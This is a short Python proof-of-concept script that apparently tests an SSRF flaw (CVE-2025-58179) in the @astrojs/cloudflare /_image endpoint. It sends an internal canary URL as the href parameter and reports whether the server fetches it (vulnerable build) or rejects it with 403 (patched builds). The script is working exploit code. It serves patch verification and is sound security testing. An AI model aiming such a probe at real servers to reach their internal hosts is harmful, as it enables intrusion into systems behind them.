#!/usr/bin/env python3
"""
ORIGINAL vulnerability (CVE-2025-58179) PoC — the direct-internal-href SSRF that
the @astrojs/cloudflare 12.6.6 patch closed by adding isRemoteAllowed().

Given-to-method PoC. Sends a DIRECT internal href to the /_image endpoint:
    /_image?href=http://canary/orig-<profile>
On a pre-58179 build (v0=12.6.5) the endpoint fetches the arbitrary href with no
allowlist -> the internal canary is reached. On the isRemoteAllowed()-guarded
builds (v1=13.1.9, v2=13.1.10) the direct internal href is rejected with 403.

    python3 original_poc.py --base-url http://127.0.0.1:4311 --profile v1
"""
import argparse
import urllib.parse
import urllib.request


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", required=True)
    ap.add_argument("--profile", default="v0")
    a = ap.parse_args()
    href = f"http://canary/orig-{a.profile}"
    url = f"{a.base_url.rstrip('/')}/_image?href={urllib.parse.quote(href, safe='')}&w=64&f=webp"
    print("GET", url)
    try:
        with urllib.request.urlopen(url, timeout=30) as r:
            print("HTTP", r.status)
    except urllib.error.HTTPError as e:
        print("HTTP", e.code)


if __name__ == "__main__":
    main()
